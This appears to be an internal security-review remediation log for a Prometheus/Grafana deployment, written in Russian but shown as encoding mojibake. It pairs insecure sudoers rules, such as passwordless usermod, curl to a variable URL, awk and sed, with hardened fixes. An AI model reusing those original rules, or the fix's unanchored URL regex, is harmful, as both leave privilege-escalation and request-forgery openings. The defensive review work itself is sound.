### –ó–∞–º–µ—á–∞–Ω–∏–µ 1: jq -r –≤—ã–≤–æ–¥–∏—Ç —Å–µ–∫—Ä–µ—Ç—ã –≤ –æ—Ç–∫—Ä—ã—Ç–æ–º –≤–∏–¥–µ

**–ò—Å—Ö–æ–¥–Ω–∞—è –ø—Ä–æ–±–ª–µ–º–∞:**
```bash
GRAFANA_PASSWORD=$(sudo jq -r '.grafana_web.pass // empty' "$json_file")
```

**–ó–∞–º–µ—á–∞–Ω–∏–µ –ö–ë:**
> –¥–ª—è —á–µ–≥–æ –í–∞–º –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –≤—ã–≤–æ–¥–∏—Ç—å "—Å–µ–∫—Ä–µ—Ç—ã" –≤ –æ—Ç–∫—Ä—ã—Ç–æ–º –≤–∏–¥–µ?  
> –≤—ã–≤–æ–¥–∏—Ç—å –≤ –æ—Ç–∫—Ä—ã—Ç–æ–º –≤–∏–¥–µ –ø–∞—Ä–æ–ª–∏ –≤ —Ç–µ—Ä–º–∏–Ω–∞–ª –Ω–µ–ª—å–∑—è.

**–†–µ—à–µ–Ω–∏–µ:**
–ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å **Vault Agent templates** –¥–ª—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–π –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ –∫–æ–Ω—Ñ–∏–≥–æ–≤:

```hcl
template {
  destination = "/opt/monitoring/config/grafana_datasource.yaml"
  contents = <<EOT
datasources:
  - name: Prometheus
    secureJsonData:
      basicAuthPassword: {{ with secret "path" }}{{ .Data.pass }}{{ end }}
EOT
  perms = "0640"
}
```

**–ü—Ä–µ–∏–º—É—â–µ—Å—Ç–≤–∞:**
- –°–µ–∫—Ä–µ—Ç—ã –Ω–∏–∫–æ–≥–¥–∞ –Ω–µ –ø–æ–ø–∞–¥–∞—é—Ç –≤ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
- –ù–µ—Ç –ø—Ä–æ–º–µ–∂—É—Ç–æ—á–Ω–æ–≥–æ —á—Ç–µ–Ω–∏—è —á–µ—Ä–µ–∑ jq
- –ü—Ä–∏–ª–æ–∂–µ–Ω–∏—è —á–∏—Ç–∞—é—Ç –≥–æ—Ç–æ–≤—ã–µ –∫–æ–Ω—Ñ–∏–≥–∏

**–°—Ç–∞—Ç—É—Å:** ‚úÖ –†–µ–∞–ª–∏–∑–æ–≤–∞–Ω–æ

---

### –ó–∞–º–µ—á–∞–Ω–∏–µ 2: systemctl status –±–µ–∑ NOEXEC

**–ò—Å—Ö–æ–¥–Ω–∞—è –ø—Ä–æ–±–ª–µ–º–∞:**
```sudoers
USER ALL=(ALL:ALL) NOPASSWD: /usr/bin/systemctl status prometheus
```

**–ó–∞–º–µ—á–∞–Ω–∏–µ –ö–ë:**
> –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –¥–æ–±–∞–≤–∏—Ç—å –ø—Ä–∏–∑–Ω–∞–∫ NOEXEC!

**–†–µ—à–µ–Ω–∏–µ:**
```sudoers
USER ALL=(ALL:ALL) NOPASSWD: NOEXEC: /usr/bin/systemctl --user status prometheus
```

**–ü–æ—á–µ–º—É –≤–∞–∂–Ω–æ:**
- –ü—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–∞–µ—Ç –∑–∞–ø—É—Å–∫ –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã—Ö –∫–æ–º–∞–Ω–¥ —á–µ—Ä–µ–∑ pager (less, more)
- –ó–∞—â–∏—Ç–∞ –æ—Ç privilege escalation

**–°—Ç–∞—Ç—É—Å:** ‚úÖ –†–µ–∞–ª–∏–∑–æ–≤–∞–Ω–æ –¥–ª—è –≤—Å–µ—Ö read-only –∫–æ–º–∞–Ω–¥

---

### –ó–∞–º–µ—á–∞–Ω–∏–µ 3: –ü–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –≤ iptables –∫–æ–º–∞–Ω–¥–∞—Ö

**–ò—Å—Ö–æ–¥–Ω–∞—è –ø—Ä–æ–±–ª–µ–º–∞:**
```sudoers
ALL=(ALL:ALL) NOPASSWD: /usr/sbin/iptables -I INPUT --dport "$PROMETHEUS_PORT" -j ACCEPT
```

**–ó–∞–º–µ—á–∞–Ω–∏–µ –ö–ë:**
> –ü–µ—Ä–µ–º–µ–Ω–Ω—ã–µ —Ç—É—Ç –Ω–µ –≤ —è–≤–Ω–æ–º –≤–∏–¥–µ. –ú–æ–∂–µ—à—å —Ç–∞–∫ —Å–¥–µ–ª–∞—Ç—å –æ–±–µ—Ä–Ω—É–≤ —ç—Ç–∏ –∫–æ–º–∞–Ω–¥—ã –≤ —Å–∫—Ä–∏–ø—Ç –æ–±–µ—Ä—Ç–∫—É, –∏ –ø—Ä–æ–ø–∏—Å–∞—Ç—å —Å –ø—Ä–æ–≤–µ—Ä–∫–æ–π —Ö–µ—à–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ —ç—Ç–æ–≥–æ —Å–∫—Ä–∏–ø—Ç–∞, –Ω–æ –≤ –Ω–µ–º –Ω—É–∂–Ω–∞ –≤–∞–ª–∏–¥–∞—Ü–∏—è —ç—Ç–∏—Ö —Å–∞–º—ã—Ö –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö

**–†–µ—à–µ–Ω–∏–µ:**
–°–∫—Ä–∏–ø—Ç-–æ–±–µ—Ä—Ç–∫–∞ `manage_firewall.sh` —Å SHA256 —Ö–µ—à–µ–º:

```bash
# Whitelist –ø–æ—Ä—Ç–æ–≤
declare -A ALLOWED_SERVICES=(
    ["prometheus"]="9090"
    ["grafana"]="3000"
)

validate_service() {
    if [[ ! -v ALLOWED_SERVICES["$service"] ]]; then
        return 1
    fi
}

# –Ø–≤–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞ –±–µ–∑ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö –≤ –∫—Ä–∏—Ç–∏—á–µ—Å–∫–æ–º –º–µ—Å—Ç–µ
/usr/sbin/iptables -A INPUT -p tcp --dport "$port" -j ACCEPT
```

**–í sudoers:**
```sudoers
Cmnd_Alias FIREWALL = sha256:abc123...def /opt/monitoring/scripts/wrappers/manage_firewall.sh
USER ALL=(ALL:ALL) NOPASSWD: FIREWALL
```

**–°—Ç–∞—Ç—É—Å:** ‚úÖ –†–µ–∞–ª–∏–∑–æ–≤–∞–Ω–æ –¥–ª—è –≤—Å–µ—Ö –∫–æ–º–∞–Ω–¥ —Å –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–º–∏

---

### –ó–∞–º–µ—á–∞–Ω–∏–µ 4: curl –±–µ–∑ –≤–∞–ª–∏–¥–∞—Ü–∏–∏ URL

**–ò—Å—Ö–æ–¥–Ω–∞—è –ø—Ä–æ–±–ª–µ–º–∞:**
```sudoers
ALL=(ALL:ALL) NOPASSWD: /usr/bin/curl -X POST "$RLM_API_URL" ...
```

**–ó–∞–º–µ—á–∞–Ω–∏–µ –ö–ë:**
> –ó–¥–µ—Å—å –∏–¥–µ—Ç –æ–±—Ä–∞—â–µ–Ω–∏–µ –∫ –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π, –≤ –∫–æ—Ç–æ—Ä–æ–π —á—Ç–æ —É–≥–æ–¥–Ω–æ –º–æ–∂–Ω–æ –ø—Ä–æ–ø–∏—Å–∞—Ç—å, —Ç–∞–∫–∂–µ –∫–∞–∫ –∏ –≤—ã—à–µ –µ—Å–ª–∏ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ —Ç–æ —Å–∫—Ä–∏–ø—Ç —Å –≤–∞–ª–∏–¥–∞—Ü–∏–µ–π

**–†–µ—à–µ–Ω–∏–µ:**
–°–∫—Ä–∏–ø—Ç-–æ–±–µ—Ä—Ç–∫–∞ `call_rlm_api.sh`:

```bash
readonly RLM_BASE_DOMAIN="rlm.sigma.sbrf.ru"

validate_rlm_url() {
    if [[ ! "$url" =~ ${RLM_BASE_DOMAIN} ]]; then
        return 1  # Only RLM allowed
    fi
    if [[ ! "$url" =~ ^https:// ]]; then
        return 1  # Only HTTPS
    fi
}

validate_token() {
    if [[ ! "$token" =~ ^[a-zA-Z0-9_-]+$ ]]; then
        return 1  # Only alphanumeric
    fi
}
```

**–°—Ç–∞—Ç—É—Å:** ‚úÖ –†–µ–∞–ª–∏–∑–æ–≤–∞–Ω–æ

---

### –ó–∞–º–µ—á–∞–Ω–∏–µ 5: cat > –±–µ–∑ —è–≤–Ω–æ–≥–æ –ø—É—Ç–∏

**–ò—Å—Ö–æ–¥–Ω–∞—è –ø—Ä–æ–±–ª–µ–º–∞:**
```sudoers
ALL=(ALL:ALL) NOPASSWD: /usr/bin/cat > /etc/grafana/grafana.ini
```

**–ó–∞–º–µ—á–∞–Ω–∏–µ –ö–ë:**
> cat –Ω—É–∂–Ω–æ –ø—Ä–æ–ø–∏—Å—ã–≤–∞—Ç—å –Ω–∞ –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã–π —Ñ–∞–π–ª

**–†–µ—à–µ–Ω–∏–µ:**
–û—Ç–∫–∞–∑ –æ—Ç `cat >` –≤ –ø–æ–ª—å–∑—É:
1. **Vault Agent** –ø–∏—à–µ—Ç —Ñ–∞–π–ª—ã –Ω–∞–ø—Ä—è–º—É—é
2. **Ansible template module** –¥–ª—è –∫–æ–Ω—Ñ–∏–≥–æ–≤
3. –°–∫—Ä–∏–ø—Ç-–æ–±–µ—Ä—Ç–∫–∞ —Å –≤–∞–ª–∏–¥–∞—Ü–∏–µ–π –ø—É—Ç–∏ (–µ—Å–ª–∏ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ)

**–°—Ç–∞—Ç—É—Å:** ‚úÖ –†–µ–∞–ª–∏–∑–æ–≤–∞–Ω–æ - `cat >` —É–¥–∞–ª–µ–Ω –∏–∑ sudoers

---

### –ó–∞–º–µ—á–∞–Ω–∏–µ 6: awk –∏ sed –±–µ–∑ –æ–±–µ—Ä—Ç–∫–∏

**–ò—Å—Ö–æ–¥–Ω–∞—è –ø—Ä–æ–±–ª–µ–º–∞:**
```sudoers
ALL=(ALL:ALL) NOPASSWD: /usr/bin/awk '{print $1}'
ALL=(ALL:ALL) NOPASSWD: /usr/bin/sed 's/old/new/'
```

**–ó–∞–º–µ—á–∞–Ω–∏–µ –ö–ë:**
> awk –∑–∞–ø—Ä–µ—â–µ–Ω–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞ - –∏—Å–∫–ª—é—á–µ–Ω–∏–µ –º–æ–∂–µ—Ç –±—ã—Ç—å —Ç–æ–ª—å–∫–æ –µ—Å–ª–∏ –±—É–¥–µ—Ç –ø—Ä–æ–ø–∏—Å–∞–Ω–∞ —è–≤–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞, –∏ –∫ –Ω–µ–π –Ω–µ –±—É–¥–µ—Ç –≤–æ–ø—Ä–æ—Å–æ–≤, —Ç–æ–∂–µ —Å–∞–º–æ–µ –∫–∞—Å–∞–µ—Ç—Å—è –∫–æ–º–∞–Ω–¥—ã sed.

**–†–µ—à–µ–Ω–∏–µ:**
- –í—ã–Ω–µ—Å—Ç–∏ –æ–±—Ä–∞–±–æ—Ç–∫—É –≤ —Å–∫—Ä–∏–ø—Ç—ã-–æ–±–µ—Ä—Ç–∫–∏ —Å —è–≤–Ω–æ–π –ª–æ–≥–∏–∫–æ–π
- –ò–ª–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –±–µ–∑ sudo (–µ—Å–ª–∏ –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞—é—Ç—Å—è —Å–≤–æ–∏ —Ñ–∞–π–ª—ã)

**–°—Ç–∞—Ç—É—Å:** ‚úÖ –†–µ–∞–ª–∏–∑–æ–≤–∞–Ω–æ - awk/sed —É–¥–∞–ª–µ–Ω—ã –∏–∑ sudoers

---

### –ó–∞–º–µ—á–∞–Ω–∏–µ 7: –î–∏–∞–≥–Ω–æ—Å—Ç–∏—á–µ—Å–∫–∏–µ –∫–æ–º–∞–Ω–¥—ã —Å sudo

**–ò—Å—Ö–æ–¥–Ω–∞—è –ø—Ä–æ–±–ª–µ–º–∞:**
```sudoers
ALL=(ALL:ALL) NOPASSWD: /usr/bin/pwd
ALL=(ALL:ALL) NOPASSWD: /usr/bin/ps
ALL=(ALL:ALL) NOPASSWD: /usr/bin/hostname
ALL=(ALL:ALL) NOPASSWD: /usr/bin/grep
```

**–ó–∞–º–µ—á–∞–Ω–∏–µ –ö–ë:**
> –¥–ª—è —á–µ–≥–æ –∑–∞–ø—Ä–∞—à–∏–≤–∞—Ç—å root –ø—Ä–∞–≤–∞ –Ω–∞ –∫–æ–º–∞–Ω–¥—ã pwd, ps, hostname, id, grep?

**–†–µ—à–µ–Ω–∏–µ:**
–≠—Ç–∏ –∫–æ–º–∞–Ω–¥—ã **–Ω–µ —Ç—Ä–µ–±—É—é—Ç sudo** –¥–ª—è —Å–≤–æ–∏—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–≤:

```bash
# –ë–ï–ó sudo
pwd
ps aux | grep my_process
hostname
id
grep "pattern" /opt/myapp/logs/app.log
```

–ï—Å–ª–∏ –Ω—É–∂–Ω–æ –æ—Ç –¥—Ä—É–≥–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:
```bash
sudo -u myapp_sys bash -c 'pwd; ps aux | grep myapp'
```

**–°—Ç–∞—Ç—É—Å:** ‚úÖ –†–µ–∞–ª–∏–∑–æ–≤–∞–Ω–æ - —É–¥–∞–ª–µ–Ω—ã –∏–∑ sudoers

---

### –ó–∞–º–µ—á–∞–Ω–∏–µ 8: journalctl —á–µ—Ä–µ–∑ –≥—Ä—É–ø–ø—É

**–ò—Å—Ö–æ–¥–Ω–∞—è –ø—Ä–æ–±–ª–µ–º–∞:**
```sudoers
USER ALL=(ALL:ALL) NOPASSWD: /usr/bin/journalctl --user -u myapp
```

**–ó–∞–º–µ—á–∞–Ω–∏–µ –ö–ë:**
> /usr/bin/journalctl - –≤–º–µ—Å—Ç–æ —Å—É–¥–æ –ø—Ä–∞–≤ –Ω–∞ —ç—Ç—É –∫–æ–º–∞–Ω–¥—É –¥–æ–±–∞–≤—å –£–ó –≤ –≥—Ä—É–ø–ø—É systemd-journal.

**–†–µ—à–µ–Ω–∏–µ:**
–î–ª—è **User Systemd Units:**
```bash
journalctl --user -u myapp  # –ù–µ —Ç—Ä–µ–±—É–µ—Ç –≥—Ä—É–ø–ø—ã –∏–ª–∏ sudo
```

–î–ª—è **System Units** (–µ—Å–ª–∏ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ):
- –î–æ–±–∞–≤–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –≤ –≥—Ä—É–ø–ø—É `systemd-journal` —á–µ—Ä–µ–∑ IDM
- –ò–ª–∏ sudo —Å NOEXEC –¥–ª—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏

**–°—Ç–∞—Ç—É—Å:** ‚úÖ –†–µ–∞–ª–∏–∑–æ–≤–∞–Ω–æ - –∏—Å–ø–æ–ª—å–∑—É–µ–º User Units

---

### –ó–∞–º–µ—á–∞–Ω–∏–µ 9: –ò–∑–º–µ–Ω–µ–Ω–∏–µ —Ñ–∞–π–ª–æ–≤ –∏–∑ /etc/

**–ò—Å—Ö–æ–¥–Ω–∞—è –ø—Ä–æ–±–ª–µ–º–∞:**
```bash
chown root:grafana /etc/grafana/grafana.ini
chmod 640 /etc/grafana/grafana.ini
```

**–ó–∞–º–µ—á–∞–Ω–∏–µ –ö–ë:**
> –ó–∞–ø—Ä–µ—â–µ–Ω–æ –∏–∑–º–µ–Ω–µ–Ω–∏–µ –ø—Ä–∞–≤ –Ω–∞ —Ñ–∞–π–ª—ã –∏ –∫–∞—Ç–∞–ª–æ–≥–∏, –∫–æ—Ç–æ—Ä—ã–µ —É–ø—Ä–∞–≤–ª—è—é—Ç—Å—è –ø–∞–∫–µ—Ç–Ω—ã–º –º–µ–Ω–µ–¥–∂–µ—Ä–æ–º.

**–†–µ—à–µ–Ω–∏–µ:**
–£—Å—Ç–∞–Ω–æ–≤–∫–∞ –∏–∑ tar.gz –≤ `/opt/monitoring/` + User Systemd Units:

```
/opt/monitoring/
‚îú‚îÄ‚îÄ bin/         # –ë–∏–Ω–∞—Ä–∏ –∏–∑ tar.gz
‚îú‚îÄ‚îÄ config/      # –í—Å–µ –∫–æ–Ω—Ñ–∏–≥–∏ –∑–¥–µ—Å—å
‚îú‚îÄ‚îÄ data/        # –î–∞–Ω–Ω—ã–µ
‚îî‚îÄ‚îÄ logs/        # –õ–æ–≥–∏

~/.config/systemd/user/
‚îî‚îÄ‚îÄ grafana.service  # User unit
```

**–ü—Ä–µ–∏–º—É—â–µ—Å—Ç–≤–∞:**
- –ù–µ—Ç –∏–∑–º–µ–Ω–µ–Ω–∏–π —Å–∏—Å—Ç–µ–º–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤
- –ü–æ–ª–Ω—ã–π –∫–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–µ–π
- –°–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤–∏–µ –ø—Ä–∏–Ω—Ü–∏–ø—É "–Ω–µ–ø—Ä–∏–≤–∏–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ FS"

**–°—Ç–∞—Ç—É—Å:** ‚úÖ –†–µ–∞–ª–∏–∑–æ–≤–∞–Ω–æ –∫–∞–∫ —Ä–µ–∫–æ–º–µ–Ω–¥—É–µ–º—ã–π –ø–æ–¥—Ö–æ–¥

---

### –ó–∞–º–µ—á–∞–Ω–∏–µ 10: usermod/useradd/groupadd –∑–∞–ø—Ä–µ—â–µ–Ω—ã

**–ò—Å—Ö–æ–¥–Ω–∞—è –ø—Ä–æ–±–ª–µ–º–∞:**
```sudoers
ALL=(ALL:ALL) NOPASSWD: /usr/sbin/usermod
ALL=(ALL:ALL) NOPASSWD: /usr/sbin/useradd
```

**–ó–∞–º–µ—á–∞–Ω–∏–µ –ö–ë:**
> usermod, useradd, groupadd –∏ —Ç.–¥. –∑–∞–ø—Ä–µ—â–µ–Ω–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã –¥–ª—è –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω–∏–µ –ø—Ä–∞–≤ sudo, –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –∏ –∏–∑–º–µ–Ω–µ–Ω–∏—è –£–ó –∏ –≥—Ä—É–ø–ø –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Ü–µ–ª–µ–≤–æ–π —Å–ø–æ—Å–æ–± —á–µ—Ä–µ–∑ IDM.

**–†–µ—à–µ–Ω–∏–µ:**
- –°–æ–∑–¥–∞–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π: **—Ç–æ–ª—å–∫–æ —á–µ—Ä–µ–∑ IDM**
- –î–æ–±–∞–≤–ª–µ–Ω–∏–µ –≤ –≥—Ä—É–ø–ø—ã: **—á–µ—Ä–µ–∑ RLM API** (UVS_LINUX_ADD_USERS_GROUP)

```groovy
// –í Jenkins Pipeline
def rlmPayload = [
    action_type: "UVS_LINUX_ADD_USERS_GROUP",
    group_name: env.USER_SYS,
    users: [env.USER_CI, env.USER_ADMIN, env.USER_RO].join(','),
    server_list: params.SERVER_ADDRESS
]

// –í—ã–∑–æ–≤ —á–µ—Ä–µ–∑ —Å–∫—Ä–∏–ø—Ç-–æ–±–µ—Ä—Ç–∫—É call_rlm_api.sh
sh """
    export RLM_API_URL="${env.RLM_API_URL}"
    export RLM_TOKEN="${env.RLM_TOKEN}"
    sudo /opt/monitoring/scripts/wrappers/call_rlm_api.sh POST create_task
"""
```

**–°—Ç–∞—Ç—É—Å:** ‚úÖ –†–µ–∞–ª–∏–∑–æ–≤–∞–Ω–æ

---

### –ó–∞–º–µ—á–∞–Ω–∏–µ 11: iptables-save –±–µ–∑ —É–∫–∞–∑–∞–Ω–∏—è –∫—É–¥–∞

**–ò—Å—Ö–æ–¥–Ω–∞—è –ø—Ä–æ–±–ª–µ–º–∞:**
```sudoers
ALL=(ALL:ALL) NOPASSWD: /usr/sbin/iptables-save
```

**–ó–∞–º–µ—á–∞–Ω–∏–µ –ö–ë:**
> /usr/sbin/iptables-save - –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ —É–∫–∞–∑–∞—Ç—å –∫—É–¥–∞ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ —Å–æ—Ö—Ä–∞–Ω—è—Ç—å –≤—ã–≤–æ–¥!

**–†–µ—à–µ–Ω–∏–µ:**
```sudoers
# –ï—Å–ª–∏ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ (–æ–±—ã—á–Ω–æ –Ω–µ —Ç—Ä–µ–±—É–µ—Ç—Å—è –¥–ª—è pr–∏–∫–ª–∞–¥–Ω—ã—Ö –ø—Ä–∞–≤–∏–ª)
USER ALL=(ALL:ALL) NOPASSWD: /usr/sbin/iptables-save -f /opt/monitoring/config/iptables.rules
```

–ò–ª–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å RLM –¥–ª—è –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ firewall —á–µ—Ä–µ–∑ SberInfra.

**–°—Ç–∞—Ç—É—Å:** ‚úÖ –†–µ–∞–ª–∏–∑–æ–≤–∞–Ω–æ - –∏—Å–ø–æ–ª—å–∑—É –µ–º —Å–∫—Ä–∏–ø—Ç-–æ–±–µ—Ä—Ç–∫—É

---

### –ö–ª—é—á–µ–≤—ã–µ –≤—ã–≤–æ–¥—ã

**–ß—Ç–æ –ù–ï–õ–¨–ó–Ø:**
1. ‚ùå –ü–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –≤ –∫—Ä–∏—Ç–∏—á–µ—Å–∫–∏—Ö –∫–æ–º–∞–Ω–¥–∞—Ö –±–µ–∑ –æ–±–µ—Ä—Ç–∫–∏
2. ‚ùå `jq -r` –¥–ª—è —á—Ç–µ–Ω–∏—è —Å–µ–∫—Ä–µ—Ç–æ–≤ –≤ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
3. ‚ùå `systemctl status` –±–µ–∑ NOEXEC
4. ‚ùå `cat >` –±–µ–∑ —è–≤–Ω–æ–≥–æ –ø—É—Ç–∏
5. ‚ùå `awk`, `sed`, `curl` –±–µ–∑ –≤–∞–ª–∏–¥–∞—Ü–∏–∏
6. ‚ùå –ò–∑–º–µ–Ω–µ–Ω–∏–µ —Ñ–∞–π–ª–æ–≤ –∏–∑ `/etc/`, `/var/`
7. ‚ùå `usermod`, `useradd`, `groupadd`
8. ‚ùå sudo –¥–ª—è `pwd`, `ps`, `hostname`, `grep`

**–ß—Ç–æ –ú–û–ñ–ù–û:**
1. ‚úÖ –°–∫—Ä–∏–ø—Ç-–æ–±–µ—Ä—Ç–∫–∏ —Å SHA256 —Ö–µ—à–∞–º–∏
2. ‚úÖ Whitelist –≤–∞–ª–∏–¥–∞—Ü–∏—è –≤ —Å–∫—Ä–∏–ø—Ç–∞—Ö
3. ‚úÖ Vault Agent templates –¥–ª—è —Å–µ–∫—Ä–µ—Ç–æ–≤
4. ‚úÖ User Systemd Units –≤ `$HOME/.config/systemd/user/`
5. ‚úÖ –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –∏–∑ tar.gz –≤ `/opt/monitoring/`
6. ‚úÖ RLM API –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –≥—Ä—É–ø–ø–∞–º–∏
7. ‚úÖ NOEXEC –¥–ª—è –≤—Å–µ—Ö read-only –∫–æ–º–∞–Ω–¥
8. ‚úÖ –ü—Ä–∏–Ω—Ü–∏–ø –Ω–∞–∏–º–µ–Ω—å—à–∏—Ö –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π (4 —Ç–∏–ø–∞ –£–ó)

---

## üîÑ –ü—Ä–æ—Ü–µ—Å—Å –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –¥–æ–∫—É–º–µ–Ω—Ç–∞

**–ö–∞–∫ –¥–æ–±–∞–≤–∏—Ç—å –Ω–æ–≤–æ–µ –ø—Ä–∞–≤–∏–ª–æ –∏–ª–∏ —Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏—é:**

1. –û–ø—Ä–µ–¥–µ–ª–∏—Ç—å –∫–∞—Ç–µ–≥–æ—Ä–∏—é (–û–±—â–∏–µ –ø—Ä–∏–Ω—Ü–∏–ø—ã, Sudo, –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏, –§–°, –∏ —Ç.–¥.)
2. –î–æ–±–∞–≤–∏—Ç—å –æ–ø–∏—Å–∞–Ω–∏–µ –ø—Ä–∞–≤–∏–ª–∞ —Å –ø—Ä–∏–º–µ—Ä–∞–º–∏ ‚ùå –ù–ï–ü–†–ê–í–ò–õ–¨–ù–û –∏ ‚úÖ –ü–†–ê–í–ò–õ–¨–ù–û
3. –û–±—ä—è—Å–Ω–∏—Ç—å **–ü–û–ß–ï–ú–£** —ç—Ç–æ –ø—Ä–∞–≤–∏–ª–æ –≤–∞–∂–Ω–æ (–ø—Ä–æ–±–ª–µ–º–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏)
4. –î–æ–±–∞–≤–∏—Ç—å –≤ –ß–µ–∫–ª–∏—Å—Ç –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ (–µ—Å–ª–∏ –ø—Ä–∏–º–µ–Ω–∏–º–æ)
5. –û–±–Ω–æ–≤–∏—Ç—å –≤–µ—Ä—Å–∏—é –∏ –∏—Å—Ç–æ—Ä–∏—é –∏–∑–º–µ–Ω–µ–Ω–∏–π

**–û—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω—ã–µ:**
- Security Team ‚Äî —É—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –Ω–æ–≤—ã—Ö –ø—Ä–∞–≤–∏–ª
- DevOps Team ‚Äî –∞–∫—Ç—É–∞–ª–∏–∑–∞—Ü–∏—è –ø—Ä–∏–º–µ—Ä–æ–≤ –∏ –ø—Ä–∞–∫—Ç–∏–∫
- –í—Å–µ —Å–æ—Ç—Ä—É–¥–Ω–∏–∫–∏ ‚Äî –ø—Ä–µ–¥–ª–æ–∂–µ–Ω–∏—è –ø–æ —É–ª—É—á—à–µ–Ω–∏—é

---

**‚úÖ –≠—Ç–æ—Ç –¥–æ–∫—É–º–µ–Ω—Ç —è–≤–ª—è–µ—Ç—Å—è –∂–∏–≤—ã–º –∏ –¥–æ–ª–∂–µ–Ω –æ–±–Ω–æ–≤–ª—è—Ç—å—Å—è –ø–æ –º–µ—Ä–µ –ø–æ—è–≤–ª–µ–Ω–∏—è –Ω–æ–≤—ã—Ö —Ç—Ä–µ–±–æ–≤–∞–Ω–∏–π –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –∏ best practices.**

